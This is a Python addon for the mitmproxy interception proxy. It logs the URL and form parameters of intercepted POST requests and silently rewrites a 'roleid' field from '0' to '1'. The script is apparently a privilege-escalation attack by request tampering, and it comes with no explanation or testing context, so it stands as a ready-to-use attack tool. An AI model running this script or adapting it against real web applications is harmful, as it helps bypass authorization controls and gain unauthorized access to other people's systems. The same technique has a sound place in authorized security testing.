from mitmproxy import ctx, http
import urllib.parse

class InterceptAndModify:
    def request(self, flow: http.HTTPFlow) -> None:
        # Check if the request method is POST
        if flow.request.method == "POST":
            # Display the intercepted request URL along with query parameters
            ctx.log.info("Intercepted Request URL:")
            ctx.log.info(flow.request.url)

            # Display the intercepted request parameters
            ctx.log.info("Intercepted Request Parameters:")
            for key, value in flow.request.urlencoded_form.items():
                ctx.log.info(f"{key}: {value}")

            # Modify the request body if needed
            if "roleid" in flow.request.urlencoded_form and flow.request.urlencoded_form["roleid"] == "0":
                # Modify the "roleid" parameter to "1"
                flow.request.urlencoded_form["roleid"] = "1"
                ctx.log.info("Modified 'roleid=0' to 'roleid=1' in the request.")

            # Update the request body with the modified parameters
            flow.request.text = urllib.parse.urlencode(flow.request.urlencoded_form)

addons = [
    InterceptAndModify()
]
